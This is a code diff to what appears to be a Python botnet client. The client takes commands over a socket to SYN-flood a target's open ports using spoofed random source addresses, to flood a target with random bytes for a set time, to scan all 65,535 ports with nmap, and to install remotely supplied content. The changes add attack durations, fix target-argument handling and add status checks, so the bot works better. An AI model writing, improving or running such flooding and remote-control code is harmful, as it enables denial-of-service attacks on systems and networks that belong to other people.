@@ -10,7 +10,7 @@ import time
 
 def synflood(TARGET,TARGETPORT,TIME):
 	currenttime = time.time()
-	timetostop = currenttime + TIME
+	timetostop = currenttime + int(TIME)
 	while time.time() < timetostop:
 		ippacket = IP()
 		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
@@ -27,8 +27,10 @@ def synflood(TARGET,TARGETPORT,TIME):
 def generaterandomstring():
 	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))
 
-def randombyteflooding(TARGET):
-	for index in range(1000):
+def randombyteflooding(TARGET,DURATION):
+	currenttime = time.time()
+	timetostop = currenttime + int(DURATION)
+	while time.time() < timetostop:
 		ippacket = IP()
 		ippacket.dst = TARGET
 		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
@@ -85,18 +87,28 @@ while True:
 		else:
 			STATUS = "ATTACKING USING SYN FLOOD"
 			nm = nmap.PortScanner()
-			nm.scan(parseddata[3],'1-65535')
-			getopenports = nm[parseddata[3]].all_tcp()
+			nm.scan(parseddata[2],'1-65535')
+			getopenports = nm[parseddata[2]].all_tcp()
 			for index in range(len(getopenports)):
 				synflood(parseddata[2],getopenports[index],parseddata[1])
 			with open("log.txt", 'a') as f:
-				f.write(str(nm[parseddata[3]].all_tcp()))
+				f.write(str(nm[parseddata[2]].all_tcp()))
 
 	if parseddata[0] == "FLOODING":
-		randombyteflooding(parseddata[1])
+		if STATUS != "READY TO ATTACK":
+			s.send(STATUS)
+
+		else:
+			randombyteflooding(parseddata[1],parseddata[2])
+			STATUS = 'READY TO ATTACK'
 
 	if parseddata[0] == "INSTALL":
-		installcontent(parseddata[1])
+		if STATUS != "READY TO ATTACK":
+			s.send(STATUS)
+
+		else:
+			installcontent(parseddata[1])
+			STATUS = 'READY TO ATTACK'
 
 			#s.send(str(nm.scaninfo()))
 
